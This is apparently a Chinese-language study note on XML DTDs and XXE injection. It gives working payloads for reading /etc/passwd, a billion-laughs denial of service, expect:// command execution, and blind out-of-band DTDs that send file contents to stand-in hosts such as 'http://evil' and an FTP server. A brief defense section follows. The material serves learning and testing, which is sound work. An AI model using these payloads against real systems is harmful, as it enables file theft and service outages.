### XML简介

#### XML

#### DTD

* DTD（Document Type Definition），用于描述一个XML文档，帮助应用更好地解析和处理XML文档
* eg.描述了一个XML文档，根元素是book，包含一个title元素和一个author元素，两者都只包含文本数据（#PCDATA）

```dtd
<!ELEMENT book (title, author)>
<!ELEMENT title (#PCDATA)>
<!ELEMENT author (#PCDATA)>
```

```xml
<book>
<title>XML Basics</title>
<author>John Doe</author>
</book>
```

* 常用语法介绍：
  
  * 元素声明：
    * \<!ELEMENT 元素名称 类别\>
    * \<!ELEMENT 元素名称 (元素内容)\>
    * \<!ELEMENT 元素名称 EMPTY\>表示空元素
  * 预定义符号：不能作为字符使用，要是使用必须扩在CDATA[]中：< > & ' "
  * 实体引用：这部分内部DOCTYPE和外部DOCTYPE引用
    * %引用：%test
    * &引用：&teamName
  
  ```xml
  <?xml version="1.0" encoding="UTF-8" ?>
  <!DOCTYPE book [
  <!ENTITY % test SYSTEM "http://localhost/a.dtd">
  %test;
  ]>
  <book>&teamName;</book>
  ```
  
  ```xml
  <!-- 被引用的外部实体 -->
  <!ENTITY teamName SYSTEM "file:///etc/passwd">
  ```

#### 内部DOCTYPE声明

* 在XML文件内部声明DTD
* eg

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE book [
<!ELEMENT book (title, author)>
<!ELEMENT title (#PCDATA)>
<!ELEMENT author (#PCDATA)>
]>
<book>
<title>XML Basics</title>
<author>John Doe</author>
</book>
```

#### 外部DOCTYPE声明

* 引用外部文件
* eg

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<!-- SYSTEM表示私有DTD，还可以使用PUBLIC表示公有 -->
<!DOCTYPE book SYSTEM "DTD-location">
<book>
<title>XML Basics</title>
<author>John Doe</author>
</book>
```

* DTD-localtion支持多种协议：

![6316E29970ACECDD6AE183228B334624](.\images\6316E29970ACECDD6AE183228B334624.jpg)

通过拓展还可以增加更多支持的协议

* DTD-location：
  * 本地文件读取：windows file:///c:/    linux file:///
  * 远程：http://、https://、ftp://

#### XML参数

在 XML 中，实体是用于表示文本片段的一种机制，允许在文档中引用、重复使用相同的文本。有两种类型的实体：通用实体（General Entities）和参数实体（Parameter Entities）。

1. **通用实体（General Entities）：**
   
   - **定义方式：** 通用实体通常用DTD中的 `<!ENTITY>` 声明进行定义。
   
   - **使用范围：** 通用实体可以在文档的任何地方使用，包括元素内容、属性值和文档中的其他位置。
   
   - **示例：**
     
     ```
     xmlCopy code<!DOCTYPE example [
       <!ENTITY greeting "Hello, ">
     ]>
     
     <root>
       <message>&greeting;World!</message>
     </root>
     ```
     
     在这个例子中，`&greeting;` 是一个通用实体，它被定义为字符串 "Hello, "，并在 `<message>` 元素中引用。

2. **参数实体（Parameter Entities）：**
   
   - **定义方式：** 参数实体通常用DTD中的 `<!ENTITY % name "value">` 声明进行定义。注意 `%` 符号用于区分通用实体和参数实体。
   
   - **使用范围：** 参数实体主要用于定义在DTD内部，用于简化DTD的结构，提高可维护性和可重用性。参数实体不能在文档实例中引用，但可以在DTD内引用。
   
   - **示例：**
     
     ```
     xmlCopy code<!DOCTYPE example [
       <!ENTITY % greeting "Hello, ">
       <!ENTITY message "%greeting;World!">
     ]>
     
     <root>
       <content>&message;</content>
     </root>
     ```
     
     在这个例子中，`%greeting;` 是一个参数实体，被定义为 "Hello, "，然后 `%message;` 在DTD中使用了 `%greeting;` 来定义最终的文本 "Hello, World!"。
   * 注意：
     
     * **参数实体只能在外部DTD使用**
     * &xxe；这样的通用实体无法用于SYSTEM等关键字后的url拼接

### XXE注入

#### 原理

#### 利用方式

##### 任意文件读取

* 最为常见的利用方式：通过外部实体引用支持的协议，引用目标文件

```xml
<!DOCTYPE root [
<!ENTITY passwd "file:///etc/passwd">
]>

<root>&passwd;</root>
```

* &passwd;将被解析为目标文件的内容，如果我们足够幸运，返回包包含我们发送过去的\<root\>&passwd;\</root\>，那么我们将会直接得到想要的文件内容

##### DOS攻击(部分解析器)

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ELEMENT lolz (#PCDATA)>
<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<tag>&lol9;</tag>
```

* 上面的payload被称为billionlaughs攻击，简单分析可以得出，xml解析过程中递归产生了上亿个lol字符，而许多的xml解析器在解析xml文档时倾向于将它的整个结构保存在内存中，这样就会占用大量内存资源，造成拒绝服务攻击

##### SSRF

##### 内网探测

* 内网存活主机探测
  * 读取目标主机上一些网络相关的敏感文件
  * 通过不同的协议向内网其他主机发起请求，根据返回内容判断主机存活情况
* 内网端口探测
  * 与上面类似

##### 利用内网脆弱的SMTP进行钓鱼

##### 命令执行

* 利用的情况较为苛刻，基本上是针对php的拓展协议expect

```xml
<!DOCTYPE root[<!ENTITY cmd SYSTEM "expect://id">]>
<dir>
<file>&cmd;</file>
</dir>
```

##### 文件上传

* 这里主要是利用了java jar://协议，该协议可以从远程获取jar文件，并将其中的内容进行解压。格式jar:{url}!{path} eg jar:http://host/application.jar!/file/within/the/zip
* jar协议处理文件过程
  * 下载jar/zip文件到临时文件
  * 提取出指定文件
  * 删除临时文件
* 上传文件有两个关键问题
  * 如何知道上传文件名：通过报错形式jar:http://localhost:9999/jar.zip!/1.jsp，如果1.php不在jar.zip包里，可以通过报错获取文件路径；接下来要获取文件名可能要通过其他漏洞或者根据具体的命名规则爆破
  * 如何延长临时文件留存时间：
    * 通过延长文件传输时间：
    * 竞争条件等

### 防御

* 禁止引用外部实体，每种语言和解析库有各自的方法，这里不再赘述
* 过滤敏感关键词或敏感字符：<!DOCTYPE   <!ENTITY    SYSTEM  PUBLIC等

### 突破

#### 无直接回显

* 构造携带想要读取的参数向恶意主机发起请求：

```xml
<!DOCTYPE root SYSTEM "dtd url">
<root>&send;</root>
```

```xml
<!-- 引用的dtd -->
<!ENTITY % xxe SYSTEM "php://filter/read=convert.base64-encode/resource=target.txt">
<!ENTITY % dtd "<!ENTITY send SYSTEM 'http://evil/?%xxe;'>">
%dtd;
```

* 最终结果来看，我们的目的是要发起请求http://evil/?想要读取的内容

* 想要读取的内容就是php://filter/read=convert.base64-encode/resource=target.txt，target是我们想要读取的文件内容，这里默认目标主机是php语言，采用了php的xml外部实体引用所支持的php伪协议，伪协议中的convert.base64-encode/resource是对目标文件进行base64编码，防止出现预定义字符而解析出错（这里也可采用下面的方法防止出现预定义字符）

* 其他常用payload
  
  ```java
  <!ENTITY % start "<![CDATA[">
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  <!ENTITY % end "]]>">
  <!ENTITY % evil "%start;%xxe;%end;">
  <!ENTITY % dtd "<!ENTITY send SYSTEM 'https://evil?%evil;'>">
  %dtd;
  ```

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % dtd SYSTEM "http://192.168.101.14:8000/attack_local.dtd">
%dtd;
%print;
%send;
]>
<comment>  <text>cute</text></comment>


<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % file SYSTEM "file:///C:/Users/Administrator/.webgoat-8.1.0//XXE/secret.txt">
<!ENTITY % print "<!ENTITY &#37; send SYSTEM 'http://192.168.101.14:8000/landing?text=%file;'>">
```

#### 要包含的目标文件有预定义字符

```xml
<!DOCTYPE root [
    <!ENTITY % start "<![CDATA[">
    <!ENTITY % xxe SYSTEM "file:\\\d:\test.txt">
    <!ENTITY % end "]]>">
    <!ENTITY % dtd SYSTEM "DTD url">
]>

<root>&evil;</root>
```

```xml
<!-- 引用的dtd -->
<!ENTITY evil "%start;%xxe;%end;">
```

* 采用之前谈到过的\<![CDATA[]]\>将包含预定义字符括起来

* 注意：
  
  * \<root\>&evil;\</root\>在进行解析时，如果&evil;包含的字符中有预定义字符，解析可能会出错
  * "%start;%xxe;%end;" 这种写法只有在外部实体才合法，所以这里没有直接写在内部DCOTYPE声明
  * 在xml文档中使用多个 &实体;  例如下面这个拼接不可行
  
  ```xml
  <!DOCTYPE root [
      <!ENTITY  start "<![CDATA[">
      <!ENTITY  xxe SYSTEM "想要包含的文件">
      <!ENTITY  end "]]>">
  ]>
  
  <root>&start;&xxe;&end;</root>
  ```

#### http和ftp对于特殊字符的限制

> 所有的【\r】 都会被替换为【\n】
> 如果含有特殊字符 【%】 【&】 会完全出错。
> 如果含有特殊字符 【’】 【”】 可以稍微绕过。
> 如果含有特殊字符 【?】，对 http 无影响，对 ftp 会造成截断。
> 如果含有特殊字符【/】， 对 http 无影响，对 ftp 需要额外增加解析的 case。
> 如果含有特殊字符【#】，会造成截断。

#### 后端对某些字符的过滤

* 对%：使用\&#37;替代

* 对&

#### 通过ftp外带

```xml
<!DOCTYPE root SYSTEM "dtd url">
<root>&send;</root>
```

```dtd
<!ENTITY % start "<![CDATA[">
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
<!ENTITY % end "]]>">
<!ENTITY % evil "%start;%xxe;%end;">
<!ENTITY % dtd "<!ENTITY send SYSTEM 'ftp://xxx/%evil;'>">
%dtd;
```

#### 高jdk版本(TODO)

在高jdk版本下，外带文件(http和jdk外带)受到换行符的影响，也就是说无法外带多行文件，以ftp为例：

* <7u141-b00 或 <8u131-b09 ：不会受文件中\n的影响
* jdk8u131：能创建 FTP 连接，外带文件内容中含有\n则抛出异常
* jdk8u232：不能创建 FTP 连接，只要 url 中含有\n就会抛出异常

如何得知java版本，在xml解析器请求外部dtd时，一般会会携带jdk的版本。

##### 报错注入

* 目标无法链接外网时，Blind XXE无法进行
* jdk版本较高时，外带文件内容受限

当目标支持报错回显时，可以采用以下payload实现报错注入：

* 这是P🐂的payload，实验环境是php + libxml 2.8.0。貌似不通用，在java的一些xml解析器下不成功

```xml
<?xml version="1.0" ?>

<!DOCTYPE message [

    <!ENTITY % NUMBER '

        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">

        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">

        &#x25;eval;

        &#x25;error;

        '>

    %NUMBER;

]>

<message>any text</message>
```

* o2oa的实战案例

### 补充

#### XInclude XXE(TODO)

> 某些应用程序接收客户端提交的数据，将其嵌入服务器端的 XML 文档中，然后解析文档。例如，将客户端提交的数据放入后端 SOAP 请求中，然后由后端 SOAP 服务处理该请求。
>
> 在这种情况下，您无法执行经典的 XXE 攻击，因为您无法控制整个 XML 文档，因此无法定义或修改元素。但是，您或许可以改用。 是 XML 规范的一部分，它允许从子文档构建 XML 文档。您可以在 XML 文档的任何数据值内放置攻击，因此，在您只控制放置在服务器端 XML 文档中的单个数据项的情况下，可以执行攻击。`DOCTYPE``XInclude``XInclude``XInclude`
>
> 要执行攻击，您需要引用命名空间并提供要包含的文件的路径。例如：`XInclude``XInclude`
>
> ```xml
> <foo xmlns:xi="http://www.w3.org/2001/XInclude">
> <xi:include parse="text" href="file:///etc/passwd"/></foo>
> ```

XInclude标准很多解析器都默认不支持，以dom为例，需要显示设置

```java
import org.jdom2.JDOMException;
import org.w3c.dom.Element;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;
import org.xml.sax.SAXException;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;
import java.io.File;
import java.io.IOException;

public class XincludeXXE {
    public static void main(String[] args) throws IOException, JDOMException, ParserConfigurationException, SAXException {
        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
        factory.setNamespaceAware(true);
        factory.setXIncludeAware(true); // 启用XInclude支持

        // 创建DocumentBuilder实例
        DocumentBuilder builder = factory.newDocumentBuilder();
        org.w3c.dom.Document doc = builder.parse(new File("D:\\l11267\\java\\program\\JavaTest\\XXETest\\src\\main\\resources\\0.xml"));
        Element root = doc.getDocumentElement();
        NodeList nodes = root.getChildNodes();
        for (int i = 0; i < nodes.getLength(); i++) {
            Node node = nodes.item(i);
            System.out.println(node.getNodeName()+node.getTextContent());
        }

    }
}
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<root>
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include parse="text" href="file:///d:/test.txt"/>
    <xi:include parse="text" href="https://webhook.uutool.cn/4pt2j105b8e0?xi"/>
</foo>
</root>
```



* 防御方式是否和外部dtd相同？
  * 不同，但是一般默认关闭

* 是否支持外带文件？
  * 一般不支持，因为无法像dtd中一样定义参数实体。但是一些XML预处理工具和XML Schema可能会提供一个外带的环境，这很依赖目标环境
* 是否支持报错回显文件？

#### 疑难杂症